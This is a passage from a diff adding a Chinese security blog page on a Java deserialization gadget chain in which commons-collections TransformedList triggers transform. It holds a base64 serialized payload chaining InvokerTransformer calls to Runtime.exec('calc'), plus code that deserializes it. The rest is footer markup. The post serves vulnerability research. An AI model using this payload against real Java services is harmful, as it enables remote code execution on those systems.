class="string">&quot;rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdLE2xn2E6tZEAwAAeHB0ABdqYXZhLmxhbmcuSW50ZXJuYWxFcnJvcnNyABxqYXZheC5zd2luZy51bmRvLlVuZG9NYW5hZ2Vy4ysheUxxykICAAJJAA5pbmRleE9mTmV4dEFkZEkABWxpbWl0eHIAHWphdmF4LnN3aW5nLnVuZG8uQ29tcG91bmRFZGl0pZ5QulPblf0CAAJaAAppblByb2dyZXNzTAAFZWRpdHN0ABJMamF2YS91dGlsL1ZlY3Rvcjt4cgAlamF2YXguc3dpbmcudW5kby5BYnN0cmFjdFVuZG9hYmxlRWRpdAgNG47tAgsQAgACWgAFYWxpdmVaAAtoYXNCZWVuRG9uZXhwAQEBc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAGRzcgAYamF2YS5zZWN1cml0eS5Db2RlU2lnbmVyXqL6Zsshmq0CAAJMAA5zaWduZXJDZXJ0UGF0aHQAHUxqYXZhL3NlY3VyaXR5L2NlcnQvQ2VydFBhdGg7TAAJdGltZXN0YW1wdAAZTGphdmEvc2VjdXJpdHkvVGltZXN0YW1wO3hwc3IAK3N1bi5zZWN1cml0eS5wcm92aWRlci5jZXJ0cGF0aC5YNTA5Q2VydFBhdGhFP1T3TEUgtAIAAUwABWNlcnRzdAAQTGphdmEvdXRpbC9MaXN0O3hyABtqYXZhLnNlY3VyaXR5LmNlcnQuQ2VydFBhdGhUN4mXfdPl+wIAAUwABHR5cGV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHBzcgAsb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmxpc3QuTGF6eUxpc3ToSpYmWppU8gIAAUwAB2ZhY3Rvcnl0AChMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL0ZhY3Rvcnk7eHIARW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5saXN0LkFic3RyYWN0U2VyaWFsaXphYmxlTGlzdERlY29yYXRvciVC5Cn2jXtrAwAAeHBzcgAzb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmxpc3QuVHJhbnNmb3JtZWRMaXN0DvL1W62zYVUCAAB4cgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbGxlY3Rpb24uVHJhbnNmb3JtZWRDb2xsZWN0aW9ueKFA96RzDpoCAAFMAAt0cmFuc2Zvcm1lcnQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHIAUW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb2xsZWN0aW9uLkFic3RyYWN0U2VyaWFsaXphYmxlQ29sbGVjdGlvbkRlY29yYXRvcla8EBO7pqE0AwAAeHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAXcEAAAAAXB4eHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3EAfgAJTAALaU1ldGhvZE5hbWVxAH4AFFsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cQB+AAsAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADFzcQB+ACt1cQB+AAsAAAACcHB0AAZpbnZva2V1cQB+ADEAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgALc3EAfgArdXEAfgALAAAAAXQABGNhbGN0AARleGVjdXEAfgAxAAAAAXEAfgA0eHNyADdvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRGYWN0b3J5zyQKt21bKggCAAFMAAlpQ29uc3RhbnRxAH4AJ3hwcQB+ACNwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBweAAAAAAAAABkcHg=&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(s);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(decode));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240415174622.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">2.</span> <span class="toc-text">结果</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&text=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&is_video=false&description=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=java反序列化漏洞commons-collections-TransformedList触发transform&body=Check out this article: http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&name=java反序列化漏洞commons-collections-TransformedList触发transform&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&t=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2024
+        N1ght
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?adec00eac37a4f07fb02d0f478140978";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
